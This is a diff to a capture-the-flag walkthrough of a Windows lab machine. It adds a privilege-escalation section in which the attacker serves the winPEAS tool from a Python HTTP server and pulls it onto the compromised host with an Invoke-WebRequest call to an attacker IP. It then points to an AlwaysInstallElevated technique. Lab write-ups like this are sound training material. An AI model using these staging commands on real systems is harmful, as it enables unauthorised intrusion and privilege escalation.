@@ -219,7 +219,35 @@
     C:\Users\Phoebe\Desktop> type user.txt
     5a55228............................
 
-// 
+### -----Privilleges Escalation-----
+
+// Lets Enumerate privilleges with [Winpeas tool](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe)
+
+// We will upload the tool with python http server
+
+    $ python3 -m http.server 1446
+
+// Enter to powsershell on target and download winPEAS64.exe
+
+    C:\Users\Phoebe\Desktop> powershell
+
+-----
+
+    PS C:\Users\Phoebe\Desktop> Invoke-WebRequest http://10.10.17.8:1446/winPEASx64.exe -OutFile C:\Users\Phoebe\Desktop\winPEASx64.exe
+    
+    PS C:\Users\Phoebe\Desktop> dir
+
+    Directory: C:\Users\Phoebe\Desktop
+
+
+    Mode                 LastWriteTime         Length Name                                                                 
+    ----                 -------------         ------ ----                                                                 
+    d-----          8/3/2021  11:46 PM                tmp                                                                  
+    -ar---          8/3/2021   4:16 PM             34 user.txt                                                             
+    -a----          8/3/2021  11:55 PM        1919488 winPEASx64.exe                                                       
+
+
+
 
 [AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)
 
